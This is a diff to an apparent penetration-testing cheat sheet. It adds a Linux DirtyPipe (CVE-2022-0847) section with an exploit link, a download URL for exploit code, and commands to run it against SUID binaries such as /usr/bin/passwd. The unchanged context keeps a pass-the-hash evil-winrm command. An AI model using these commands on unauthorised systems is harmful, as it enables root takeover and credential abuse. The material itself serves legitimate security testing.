@@ -10,6 +10,7 @@ Index
 - [SeBackupPrivileges](#SeBackupPrivileges)
     - [Exploit by secrets dump](#Exploit-by-secrets-dump)
 - [Windows.old directory](#Windows.old-directory)
+- [Linux DirtyPipe](#Linux-DirtyPipe)
 
 ## System Enumeration
 ### General Info
@@ -185,4 +186,23 @@ evil-winrm -i 192.168.1.1 -u Administrator -H 00000000000000000000000000000000
 ```
 
 ## Windows.old directory
-- Copy SAM and SYSTEM files
+TODO
+
+## Linux DirtyPipe
+Exploit available on Exploit-DB (https://www.exploit-db.com/exploits/50808)
+
+Output from linpeas.sh:
+```
+[+] [CVE-2022-0847] DirtyPipe
+
+   Details: https://dirtypipe.cm4all.com/
+   Exposure: less probable
+   Tags: ubuntu=(20.04|21.04),debian=11
+   Download URL: https://haxx.in/files/dirtypipez.c
+```
+
+If file with interesting perm. in presents (SUID):
+``` bash
+./exploit /path/to/suid_binary
+./exploit /usr/bin/passwd
+```
